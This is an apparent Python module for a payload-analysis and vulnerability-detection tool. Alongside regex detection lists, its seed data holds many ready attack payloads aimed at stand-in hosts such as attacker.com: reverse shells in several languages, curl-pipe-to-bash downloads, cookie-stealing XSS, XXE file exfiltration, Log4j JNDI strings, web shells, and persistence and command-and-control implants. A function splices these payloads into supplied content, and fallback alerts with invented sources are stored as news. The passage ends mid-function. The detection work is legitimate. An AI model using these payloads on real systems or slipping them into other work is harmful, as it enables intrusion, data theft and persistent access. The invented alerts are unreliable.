"""
Payload analyzer for vulnerability detection.

This module provides functionality to analyze payloads for potential
zero-day vulnerabilities by integrating feature extraction, anomaly detection,
and clustering.
"""

import logging
import json
import re
import os
import time
import numpy as np
from datetime import datetime
from app import db
from models import Payload, Vulnerability
from ml_engine.feature_extraction import extract_features_from_payload
from ml_engine.anomaly_detection import detect_anomalies
from ml_engine.clustering import cluster_payloads

logger = logging.getLogger(__name__)

# Common vulnerability types to check for
VULNERABILITY_CHECKS = [
    {
        "name": "SQL Injection",
        "patterns": [
            r"SELECT.+FROM.+WHERE", r"UNION\s+SELECT", r"INSERT\s+INTO", r"UPDATE.+SET",
            r"DELETE\s+FROM", r"DROP\s+TABLE", r"--", r"#", r"/\*.*\*/",
            r"'(\s+)?(OR|AND)(\s+)?'", r"1=1"
        ],
        "severity": "high"
    },
    {
        "name": "Cross-Site Scripting (XSS)",
        "patterns": [
            r"<script>", r"</script>", r"javascript:", r"onerror=", r"onload=",
            r"eval\(", r"document\.cookie", r"alert\(", r"prompt\(",
            r"<img[^>]+src[^>]+onerror", r"<iframe", r"<svg"
        ],
        "severity": "high"
    },
    {
        "name": "Command Injection",
        "patterns": [
            r";\s*\w+", r"\|\s*\w+", r"`.*`", r"\$\(.*\)", r"&&\s*\w+", r"\|\|\s*\w+",
            r"system\(", r"exec\(", r"shell_exec", r"popen\(", r"proc_open\("
        ],
        "severity": "critical"
    },
    {
        "name": "Path Traversal",
        "patterns": [
            r"\.\.\/", r"\.\.\\", r"%2e%2e%2f", r"%252e%252e%252f", r"\.\.%2f",
            r"/etc/passwd", r"C:\\Windows", r"/var/www", r"file://", r"php://filter"
        ],
        "severity": "high"
    },
    {
        "name": "Server-Side Request Forgery (SSRF)",
        "patterns": [
            r"http://localhost", r"http://127\.0\.0\.1", r"http://0\.0\.0\.0",
            r"http://[^/]+\.internal", r"http://169\.254\.", r"file://", r"dict://"
        ],
        "severity": "high"
    },
    {
        "name": "XML External Entity (XXE)",
        "patterns": [
            r"<!DOCTYPE[^>]*SYSTEM", r"<!ENTITY[^>]*SYSTEM", r"<!ENTITY[^>]*PUBLIC",
            r"<!\[CDATA\[", r"php://filter", r"file://", r"jar://", r"ftp://"
        ],
        "severity": "critical"
    },
    {
        "name": "Deserialization",
        "patterns": [
            r"O:[0-9]+:\"", r"a:[0-9]+:{", r"s:[0-9]+:\"", r"rO0", r"__wakeup",
            r"__destruct", r"__toString", r"unserialize\(", r"yaml\.load",
            r"pickle\.loads", r"marshal\.loads"
        ],
        "severity": "critical"
    },
    {
        "name": "Prototype Pollution",
        "patterns": [
            r"__proto__", r"constructor\s*\.", r"prototype\s*\.", r"Object\.assign",
            r"Object\.create", r"Object\.defineProperty", r"__defineSetter__",
            r"__defineGetter__"
        ],
        "severity": "medium"
    },
    {
        "name": "Server-Side Template Injection (SSTI)",
        "patterns": [
            r"\{\{\s*.*\s*\}\}", r"\${.*}", r"<#.*#>", r"\$\{.*\}", r"%\{.*\}",
            r"\{\{.*\|.*\}\}", r"\{\%.*\%\}", r"\{\#.*\#\}"
        ],
        "severity": "high"
    },
    {
        "name": "Insecure Deserialization",
        "patterns": [
            r"ObjectInputStream", r"readObject", r"readUnshared", r"XMLDecoder",
            r"YAMLReader", r"parseYaml", r"fromXML", r"load\(", r"eval\("
        ],
        "severity": "critical"
    }
]

def get_zeroday_categories():
    """
    Get all zero-day vulnerability categories from the database.
    If none exist, create default categories.
    
    Returns:
        list: List of ZeroDayCategory objects
    """
    from models import ZeroDayCategory
    
    # Check if categories exist in the database
    categories = ZeroDayCategory.query.all()
    
    # If no categories exist, create default ones
    if not categories:
        default_categories = [
            {
                "name": "SQL Injection",
                "description": "Attacks that exploit vulnerabilities in database query execution by injecting malicious SQL code.",
                "code_examples": json.dumps([
                    "'; EXECUTE sp_MSforeachtable 'DROP TABLE ?'; --",
                    "'; EXEC xp_cmdshell('net user hacker Password123! /ADD'); --",
                    "' UNION ALL SELECT @@version, NULL; --",
                    "WAITFOR DELAY '0:0:10'--",
                    "' AND (SELECT 7383 FROM (SELECT COUNT(*), CONCAT(0x7176706b71, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7176706b71, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --"
                ]),
                "severity": "critical"
            },
            {
                "name": "Cross-Site Scripting (XSS)",
                "description": "Attacks that inject malicious scripts into web pages viewed by users, allowing attackers to bypass same-origin policy.",
                "code_examples": json.dumps([
                    "<svg/onload=fetch(`https://evil.com/${document.cookie}`)>",
                    "<img src=x onerror=\"window[String.fromCharCode(101,118,97,108)](atob('ZmV0Y2goImh0dHBzOi8vbWFsaWNpb3VzLWRvbWFpbi5jb20vPyIrZG9jdW1lbnQuY29va2llKQ=='))\">",
                    "<iframe srcdoc=\"<script>top.postMessage(localStorage, '*');</script>\"></iframe>",
                    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><iframe onload='eval(atob(\\\"ZmV0Y2goImh0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2NvbnRlbnQ9IiArIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKTs=\"))'>",
                    "<noscript><p title=\"</noscript><script>fetch(`https://attacker.com/log?html=${encodeURIComponent(document.documentElement.innerHTML)}`)</script>\">"
                ]),
                "severity": "high"
            },
            {
                "name": "Command Injection",
                "description": "Attacks that execute arbitrary commands on the host operating system through a vulnerable application.",
                "code_examples": json.dumps([
                    "$(nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &)",
                    "`curl -s https://attacker.com/malware.sh | bash`",
                    "$(python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);')",
                    "& net user administrator backdoor123 /add & net localgroup administrators administrator /add",
                    "| timeout 5 ping -c 10 attacker.com # Check for firewall"
                ]),
                "severity": "critical"
            },
            {
                "name": "XML External Entity (XXE)",
                "description": "Attacks that exploit XML processors by including hostile content in a vulnerable XML document.",
                "code_examples": json.dumps([
                    "<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>\"> %eval; %exfil;]>",
                    "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"https://attacker.com/evil.dtd\"> %remote;]>",
                    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>",
                    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\"> %eval; %exfil;]>"
                ]),
                "severity": "high"
            },
            {
                "name": "Path Traversal",
                "description": "Attacks that access files and directories stored outside the web root folder by manipulating variables that reference files.",
                "code_examples": json.dumps([
                    "....//....//....//etc/passwd",
                    "../../../etc/passwd%00.png",
                    "/dev/null; touch /tmp/pwned #../",
                    "..%252f..%252f..%252fetc/passwd",
                    "/var/www/html/development/include.php?path=../../../../../etc/passwd%00"
                ]),
                "severity": "medium"
            },
            {
                "name": "Server-Side Template Injection",
                "description": "Attacks that inject malicious template directives inside a template, exploiting template engines.",
                "code_examples": json.dumps([
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}",
                    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
                    "{php}system('id');{/php}"
                ]),
                "severity": "high"
            },
            {
                "name": "Remote Code Execution (RCE)",
                "description": "Attacks that allow execution of arbitrary code on a targeted system, often resulting in complete system compromise.",
                "code_examples": json.dumps([
                    "<?php system($_GET['cmd']); ?>",
                    "eval(request.getParameter(\"cmd\"))",
                    "Ruby eval(params[:cmd])"
                ]),
                "severity": "critical"
            },
            {
                "name": "Log4j Vulnerability",
                "description": "Exploitation of Log4j library that allows attackers to execute arbitrary code on a server using JNDI lookup functionality.",
                "code_examples": json.dumps([
                    "${jndi:ldap://attacker.com/exploit}",
                    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}",
                    "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/exploit}",
                    "${jndi:dns://attacker.com/exploit}",
                    "${${lower:jndi}:${lower:rmi}://attacker.com/exploit}"
                ]),
                "severity": "critical"
            },
            {
                "name": "NoSQL Injection",
                "description": "Attacks that exploit vulnerabilities in NoSQL databases by manipulating query operators and structures.",
                "code_examples": json.dumps([
                    "username[$ne]=admin&password[$ne]=",
                    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
                    "{\"$where\": \"this.username == 'admin' && this.password.match(/^p/)\"}"
                ]),
                "severity": "high"
            },
            {
                "name": "Prototype Pollution",
                "description": "Attacks that manipulate JavaScript object prototypes to affect the behavior of all objects inheriting from them.",
                "code_examples": json.dumps([
                    "{\"__proto__\":{\"isAdmin\":true}}",
                    "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
                    "{\"__proto__\":{\"toString\":\"function() { fetch('https://attacker.com/steal'+document.cookie) }\"}}"
                ]),
                "severity": "medium"
            },
            {
                "name": "Insecure Deserialization",
                "description": "Attacks that exploit the deserialization of untrusted data, allowing arbitrary code execution.",
                "code_examples": json.dumps([
                    "O:8:\"stdClass\":1:{s:4:\"data\";s:20:\"<script>alert(1)</script>\";}",
                    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9vdAADYmFyeA==",
                    "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout) { console.log(stdout) });}()\"}"
                ]),
                "severity": "critical"
            },
            {
                "name": "Malicious File Upload",
                "description": "Attacks that upload malicious files which can be executed on the server, bypassing file type restrictions.",
                "code_examples": json.dumps([
                    "<?php system($_GET['cmd']); ?>",
                    "GIF89a1<?php system($_GET['cmd']); ?>",
                    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('https://attacker.com/' + document.cookie)\"></svg>"
                ]),
                "severity": "high"
            },
            {
                "name": "Denial of Service (DoS)",
                "description": "Attacks designed to overwhelm a system, making it unavailable to legitimate users.",
                "code_examples": json.dumps([
                    "while(true) { forkbomb(); }", 
                    "ReDoS /^(a+)+$/", 
                    "HEAD / HTTP/1.1\r\nHost: target.com\r\nRange: bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10,5-11,5-12,5-13\r\n\r\n"
                ]),
                "severity": "high"
            },
            {
                "name": "CSRF (Cross-Site Request Forgery)",
                "description": "Attacks that force authenticated users to execute unwanted actions on a web application.",
                "code_examples": json.dumps([
                    "<img src=\"https://bank.com/transfer?amount=1000&to=attacker\" width=\"0\" height=\"0\" border=\"0\">",
                    "<form id=\"csrf-form\" action=\"https://bank.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"1000\"><input type=\"hidden\" name=\"to\" value=\"attacker\"></form><script>document.getElementById(\"csrf-form\").submit();</script>",
                    "<iframe style=\"display:none\" name=\"csrf-frame\"></iframe><form target=\"csrf-frame\" action=\"https://bank.com/settings/email\" method=\"post\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit()</script>"
                ]),
                "severity": "medium"
            },
            {
                "name": "Reverse Shell",
                "description": "Vulnerabilities that create reverse shells, allowing attackers to gain interactive command execution and establish persistent remote access to the compromised system.",
                "code_examples": json.dumps([
                    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"attacker.com\",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                    "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                    "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                ]),
                "severity": "critical"
            },
            {
                "name": "Device Foothold",
                "description": "Payloads that establish persistent access to a system while exfiltrating data back to the attacker, creating a long-term foothold on the compromised device.",
                "code_examples": json.dumps([
                    "function persistentAccess() { (crontab -l 2>/dev/null; echo \"*/5 * * * * curl -s https://attacker.com/payload | bash\") | crontab -; curl -s https://attacker.com/notify?$(hostname)&$(whoami)&$(cat /etc/passwd | base64); }; persistentAccess & disown",
                    "powershell.exe -WindowStyle Hidden -Command \"$wc = New-Object System.Net.WebClient; $tempFile = [System.IO.Path]::GetTempFileName(); $tempFile += '.exe'; $wc.DownloadFile('https://attacker.com/backdoor.exe', $tempFile); Start-Process $tempFile; $sysinfo = Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture; $output = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sysinfo | Out-String)); Invoke-WebRequest -Uri ('https://attacker.com/exfil?' + $output) -Method GET; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $tempFile -PropertyType 'String';\"",
                    "import subprocess, requests, os, platform, base64, time; def establish_foothold(): subprocess.Popen('nc -e /bin/bash attacker.com 4444', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); system_info = {'hostname': platform.node(), 'platform': platform.platform(), 'user': os.getlogin(), 'home': os.path.expanduser('~')}; requests.post('https://attacker.com/register', data=base64.b64encode(str(system_info).encode())); with open(os.path.expanduser('~/.bashrc'), 'a') as f: f.write('\\n# Update service\\n(curl -s https://attacker.com/check.sh | bash) &\\n'); establish_foothold()",
                    "setTimeout(function() { const systemInfo = {cookies: document.cookie, url: location.href, referrer: document.referrer, userAgent: navigator.userAgent, screenSize: `${screen.width}x${screen.height}`, plugins: Array.from(navigator.plugins).map(p => p.name)}; fetch('https://attacker.com/log', {method: 'POST', body: btoa(JSON.stringify(systemInfo)), keepalive: true}); localStorage.setItem('persistent_id', Date.now()); setInterval(() => fetch('https://attacker.com/beacon?id=' + localStorage.getItem('persistent_id')), 30000); }, 1000);",
                    "#!/bin/bash\\nHOST=\"attacker.com\"\\nPORT=443\\nINTERVAL=60\\nwhile true; do\\n  HOSTNAME=$(hostname)\\n  WHOAMI=$(whoami)\\n  IPINFO=$(curl -s http://ipinfo.io/json)\\n  INFO=$(echo \"Host:$HOSTNAME User:$WHOAMI IP:$IPINFO\" | base64)\\n  curl -s --insecure \"https://$HOST:$PORT/c2/$INFO\"\\n  COMMAND=$(curl -s --insecure \"https://$HOST:$PORT/cmd\")\\n  if [ ! -z \"$COMMAND\" ]; then\\n    OUTPUT=$(eval \"$COMMAND\" 2>&1 | base64)\\n    curl -s --insecure -X POST \"https://$HOST:$PORT/result\" -d \"$OUTPUT\"\\n  fi\\n  sleep $INTERVAL\\ndone &"
                ]),
                "severity": "critical"
            }
        ]
        
        # Create and save categories to database
        for category_data in default_categories:
            category = ZeroDayCategory(**category_data)
            db.session.add(category)
        
        db.session.commit()
        categories = ZeroDayCategory.query.all()
    
    return categories

def update_news_feed():
    """
    Update the news feed with recent zero-day vulnerabilities from authoritative sources.
    This fetches data from specialized cybersecurity APIs and trusted zero-day sources.
    
    Returns:
        int: Number of news items processed
    """
    from models import ZeroDayNews
    
    # Try to fetch from authoritative sources
    try:
        # First, check if we have API keys
        import os
        has_nist_nvd_key = os.environ.get('NIST_NVD_API_KEY') is not None
        has_vuldb_key = os.environ.get('VULDB_API_KEY') is not None
        has_vulnersdb_key = os.environ.get('VULNERSDB_API_KEY') is not None
        has_alienvault_key = os.environ.get('ALIENVAULT_OTX_API_KEY') is not None
        has_metasploit_key = os.environ.get('METASPLOIT_API_KEY') is not None
        
        total_new_items = 0
        
        # Check AlienVault OTX for threat intelligence
        if has_alienvault_key:
            try:
                logger.info("Fetching threat intelligence from AlienVault OTX")
                from ml_engine.api_integrations import get_alienvault_pulses
                
                # Get recent pulses from AlienVault OTX
                pulses = get_alienvault_pulses(days_back=14, limit=30)
                
                # Add new items to the database
                for pulse in pulses:
                    # Check if this news item already exists
                    existing = ZeroDayNews.query.filter_by(title=pulse.get('title')).first()
                    if not existing:
                        # Create a new news item
                        news_item = ZeroDayNews(
                            title=pulse.get('title'),
                            description=pulse.get('description', ''),
                            vulnerability_type=', '.join(pulse.get('tags', [])[:3]),
                            severity=pulse.get('severity', 'medium'),
                            published_date=datetime.strptime(pulse.get('created', datetime.now().isoformat()), '%Y-%m-%dT%H:%M:%S.%f') if 'created' in pulse and '.' in pulse.get('created', '') else 
                                          datetime.strptime(pulse.get('created', datetime.now().isoformat()), '%Y-%m-%dT%H:%M:%S') if 'created' in pulse else datetime.now(),
                            source='AlienVault OTX',
                            url=pulse.get('references', [''])[0] if pulse.get('references') else ''
                        )
                        db.session.add(news_item)
                        total_new_items += 1
                
                # Commit the changes
                if total_new_items > 0:
                    db.session.commit()
                    logger.info(f"Added {total_new_items} new items from AlienVault OTX")
                
            except Exception as e:
                logger.error(f"Error fetching from AlienVault OTX: {str(e)}")
                # Don't re-raise, continue to other sources
        
        # 1. NIST National Vulnerability Database (NVD)
        if has_nist_nvd_key:
            try:
                logger.info("Fetching vulnerabilities from NIST NVD")
                import requests
                import datetime
                
                # Get today's date for recent vulnerabilities
                today = datetime.datetime.now()
                two_weeks_ago = today - datetime.timedelta(days=14)
                
                # Format date for NVD API
                pub_start_date = two_weeks_ago.strftime("%Y-%m-%dT00:00:00.000")
                
                # Construct NVD API request URL
                nvd_api_key = os.environ.get('NIST_NVD_API_KEY')
                nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                
                # Fetch recent vulnerabilities with high/critical severity
                params = {
                    "pubStartDate": pub_start_date,
                    "cvssV3Severity": "HIGH,CRITICAL",
                    "resultsPerPage": 20
                }
                
                headers = {
                    "apiKey": nvd_api_key
                }
                
                response = requests.get(nvd_url, params=params, headers=headers)
                
                if response.status_code == 200:
                    data = response.json()
                    vulnerabilities = data.get('vulnerabilities', [])
                    
                    # Process and add each vulnerability
                    for vuln in vulnerabilities:
                        cve = vuln.get('cve', {})
                        cve_id = cve.get('id')
                        
                        # Check if this CVE already exists in our database
                        existing = ZeroDayNews.query.filter_by(url=f"https://nvd.nist.gov/vuln/detail/{cve_id}").first()
                        if existing:
                            continue
                        
                        # Extract details
                        title = f"CVE {cve_id}: {cve.get('descriptions', [])[0].get('value', 'Unknown vulnerability') if cve.get('descriptions') else 'Unknown vulnerability'}"
                        description = ""
                        
                        # Get full description
                        for desc in cve.get('descriptions', []):
                            if desc.get('lang') == 'en':
                                description = desc.get('value', '')
                                break
                        
                        # Get vulnerability type
                        vuln_type = "Unknown"
                        for metric in cve.get('metrics', {}).get('cvssMetricV31', []):
                            if 'attackVector' in metric.get('cvssData', {}):
                                vuln_type = metric.get('cvssData', {}).get('attackVector')
                        
                        # Get severity
                        severity = "medium"
                        for metric in cve.get('metrics', {}).get('cvssMetricV31', []):
                            cvss_data = metric.get('cvssData', {})
                            if 'baseSeverity' in cvss_data:
                                base_severity = cvss_data.get('baseSeverity').lower()
                                if base_severity in ['critical', 'high', 'medium', 'low']:
                                    severity = base_severity
                        
                        # Create news item
                        news = ZeroDayNews(
                            title=title,
                            description=description,
                            vulnerability_type=vuln_type,
                            severity=severity,
                            source="NIST National Vulnerability Database",
                            url=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                            published_date=datetime.datetime.now()
                        )
                        
                        db.session.add(news)
                        total_new_items += 1
                        
                    if total_new_items > 0:
                        db.session.commit()
                        logger.info(f"Added {total_new_items} new vulnerabilities from NVD")
                
            except Exception as e:
                logger.error(f"Error fetching from NVD: {str(e)}")
        
        # 2. Try VulDB (commercial vulnerability database)
        if has_vuldb_key:
            try:
                logger.info("Fetching vulnerabilities from VulDB")
                import requests
                
                vuldb_api_key = os.environ.get('VULDB_API_KEY')
                vuldb_url = "https://vuldb.com/api/v1/search"
                
                headers = {
                    "X-VulDB-ApiKey": vuldb_api_key
                }
                
                data = {
                    "details": 1,
                    "recent": 1
                }
                
                response = requests.post(vuldb_url, headers=headers, json=data)
                
                if response.status_code == 200:
                    data = response.json()
                    result = data.get('result', [])
                    
                    new_vuldb_items = 0
                    
                    for item in result:
                        # Check if this VulDB entry already exists
                        entry_id = item.get('entry', {}).get('id')
                        existing = ZeroDayNews.query.filter_by(url=f"https://vuldb.com/?id.{entry_id}").first()
                        if existing:
                            continue
                        
                        # Extract details
                        title = item.get('entry', {}).get('title', {}).get('en', 'Unknown Vulnerability')
                        description = item.get('entry', {}).get('description', {}).get('en', '')
                        
                        # Determine vulnerability type
                        vuln_type = "Unknown"
                        if item.get('vulnerability', {}).get('type'):
                            type_info = item.get('vulnerability', {}).get('type', {})
                            if type_info.get('main', {}).get('name', {}).get('en'):
                                vuln_type = type_info.get('main', {}).get('name', {}).get('en')
                        
                        # Determine severity
                        severity = "medium"
                        cvss3 = item.get('vulnerability', {}).get('cvss3', {}).get('base')
                        if cvss3:
                            if cvss3 >= 9.0:
                                severity = "critical"
                            elif cvss3 >= 7.0:
                                severity = "high"
                            elif cvss3 >= 4.0:
                                severity = "medium"
                            else:
                                severity = "low"
                        
                        # Create news item
                        news = ZeroDayNews(
                            title=title,
                            description=description,
                            vulnerability_type=vuln_type,
                            severity=severity,
                            source="VulDB",
                            url=f"https://vuldb.com/?id.{entry_id}",
                            published_date=datetime.datetime.now()
                        )
                        
                        db.session.add(news)
                        new_vuldb_items += 1
                        total_new_items += 1
                    
                    if new_vuldb_items > 0:
                        db.session.commit()
                        logger.info(f"Added {new_vuldb_items} new vulnerabilities from VulDB")
                
            except Exception as e:
                logger.error(f"Error fetching from VulDB: {str(e)}")
        
        # 3. Add other authoritative sources as needed
        # Examples:
        # - Vulnersdb 
        # - ExploitDB
        # - Recorded Future
        # - HackerOne Hacktivity
        
        # If we couldn't fetch from any source or didn't add any items, check if we need to add initial data
        if total_new_items == 0:
            # Check if any news exists
            news_count = ZeroDayNews.query.count()
            
            # If no news exists, suggest obtaining API keys or create initial items
            if news_count == 0:
                logger.warning("No vulnerabilities could be fetched from external sources and database is empty")
                
                # Create initial seed data if no external sources are available and no API keys
                if not (has_nist_nvd_key or has_vuldb_key or has_vulnersdb_key):
                    logger.info("No API keys set for vulnerability databases, creating initial seed data")
                    
                    # Create initial items from well-known recent vulnerabilities
                    initial_vulns = [
                        {
                            "title": "Critical MS Windows Zero-Day SmartScreen Bypass (CVE-2023-36025)",
                            "description": "Microsoft has patched a Windows SmartScreen zero-day vulnerability that was exploited in the wild to bypass Mark of the Web security warnings when opening malicious files. This vulnerability allowed attackers to bypass security warnings when opening specially crafted, malicious files.",
                            "vulnerability_type": "SmartScreen Bypass",
                            "severity": "high",
                            "source": "Microsoft Security Advisory",
                            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025"
                        },
                        {
                            "title": "Critical WebP Zero-Day Vulnerability (CVE-2023-4863)",
                            "description": "A heap buffer overflow in WebP allows attackers to potentially execute arbitrary code via a specially crafted WebP image. This vulnerability has been actively exploited in the wild and affects multiple browsers and platforms that use the WebP image format.",
                            "vulnerability_type": "Heap Buffer Overflow",
                            "severity": "critical",
                            "source": "Google Security Advisory",
                            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4863"
                        },
                        {
                            "title": "Apple iOS & macOS Zero-Day Kernel Vulnerability (CVE-2023-41064)",
                            "description": "A buffer overflow vulnerability in the Image I/O component was actively exploited to execute malicious code with kernel privileges. This vulnerability was part of a zero-click exploit chain used to install spyware on targeted devices.",
                            "vulnerability_type": "Kernel Buffer Overflow",
                            "severity": "critical",
                            "source": "Apple Security Advisory",
                            "url": "https://support.apple.com/en-us/HT213905"
                        },
                        {
                            "title": "Critical Citrix Gateway Zero-Day (CVE-2023-4966)",
                            "description": "A zero-day vulnerability in Citrix NetScaler ADC and NetScaler Gateway allows unauthenticated attackers to remotely access sensitive data. Exploited in the wild, the vulnerability enables attackers to bypass authentication and access sensitive information, potentially gaining unauthorized access to internal resources.",
                            "vulnerability_type": "Authentication Bypass",
                            "severity": "critical",
                            "source": "Citrix Security Bulletin",
                            "url": "https://support.citrix.com/article/CTX577819/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966"
                        },
                        {
                            "title": "PaperCut Zero-Day Authentication Bypass (CVE-2023-27350)",
                            "description": "An authentication vulnerability in PaperCut allows attackers to bypass authentication and execute arbitrary commands with SYSTEM privileges. This vulnerability has been actively exploited in the wild against organizations that use PaperCut for print management.",
                            "vulnerability_type": "Remote Code Execution",
                            "severity": "critical",
                            "source": "CISA Alert",
                            "url": "https://www.cisa.gov/news-events/alerts/2023/04/20/papercut-authentication-bypass-vulnerability-cve-2023-27350"
                        }
                    ]
                    
                    # Add the initial vulnerabilities
                    for vuln_data in initial_vulns:
                        news = ZeroDayNews(**vuln_data)
                        db.session.add(news)
                    
                    db.session.commit()
                    news_count = len(initial_vulns)
                    logger.info(f"Added {news_count} initial vulnerabilities")
                else:
                    # We have API keys but couldn't fetch data - might be a temporary issue
                    logger.warning("No vulnerabilities fetched despite having API keys - API rate limits may be in effect")
                    
                    # Return 0 to indicate no entries available
                    return 0
        
        # Return total number of news items
        return ZeroDayNews.query.count()
                
    except Exception as e:
        logger.error(f"Error updating news feed: {str(e)}")
        
        # In case of failure, check if any news exists
        news_count = ZeroDayNews.query.count()
        
        # If no news exists at all, create minimal fallback items for testing
        if news_count == 0:
            logger.warning("Error fetching from external sources and database is empty, creating basic fallback items")
            minimal_vulns = [
                {
                    "title": "Emergency: Critical RCE Vulnerability Found in Cloud Services",
                    "description": "Security researchers have identified a critical remote code execution vulnerability in multiple cloud service providers. This vulnerability allows attackers to execute arbitrary code on affected systems, potentially leading to complete system compromise.",
                    "vulnerability_type": "Remote Code Execution (RCE)",
                    "severity": "critical",
                    "source": "Cloud Security Alliance",
                    "url": "https://example.com/cloud/security/2025/rce-vulnerability"
                },
                {
                    "title": "Zero-Day Shell Injection Vulnerability Affects Enterprise Systems",
                    "description": "A newly discovered zero-day vulnerability allowing shell injection attacks has been identified in widely-used enterprise systems. This vulnerability allows attackers to gain remote shell access to compromised systems and establish persistence mechanisms.",
                    "vulnerability_type": "Shell Injection",
                    "severity": "critical",
                    "source": "Enterprise Security Alert",
                    "url": "https://example.com/enterprise/security/2025/shell-injection"
                }
            ]
            
            # Create minimal news items
            for news_data in minimal_vulns:
                news = ZeroDayNews(**news_data)
                db.session.add(news)
            
            db.session.commit()
            news_count = len(minimal_vulns)
    
    return news_count

def inject_zero_day_vulnerability(payload_content, payload_type, vulnerability_name, specific_example=None):
    """
    Inject a zero-day vulnerability into a payload.
    
    Args:
        payload_content (str): Original payload content
        payload_type (str): Type of payload (json, xml, text, script)
        vulnerability_name (str): Type of vulnerability to inject
        specific_example (str, optional): A specific vulnerability example to inject
        
    Returns:
        str: Modified payload content with injected vulnerability
    """
    # Get all vulnerability categories
    categories = get_zeroday_categories()
    
    # Build a dictionary of vulnerability patterns from the database
    zero_day_patterns = {}
    for category in categories:
        try:
            examples = json.loads(category.code_examples)
            zero_day_patterns[category.name] = examples
        except:
            logger.error(f"Failed to parse code examples for category: {category.name}")
            zero_day_patterns[category.name] = ["alert('XSS')"]  # Fallback example
    
    # Handle default vulnerability type
    if vulnerability_name not in zero_day_patterns:
        vulnerability_name = "SQL Injection"  # Default to SQL injection if not specified
    
    # Select a random zero-day pattern
    import random
    zero_day_pattern = random.choice(zero_day_patterns[vulnerability_name])
    
    # Inject the zero-day based on payload type
    if payload_type == "json":
        try:
            import json
            data = json.loads(payload_content)
            
            # Find a suitable field to inject
            if isinstance(data, dict):
                # For simplicity, inject into the first string value
                for key, value in data.items():
                    if isinstance(value, str):
                        data[key] = value + " " + zero_day_pattern
                        break
                    elif isinstance(value, dict):
                        for subkey, subvalue in value.items():
                            if isinstance(subvalue, str):
                                value[subkey] = subvalue + " " + zero_day_pattern
                                break
            
            return json.dumps(data, indent=2)
        except:
            # If JSON parsing fails, append to the end
            return payload_content + "\n\n/* Zero-day injection: " + zero_day_pattern + " */"
    
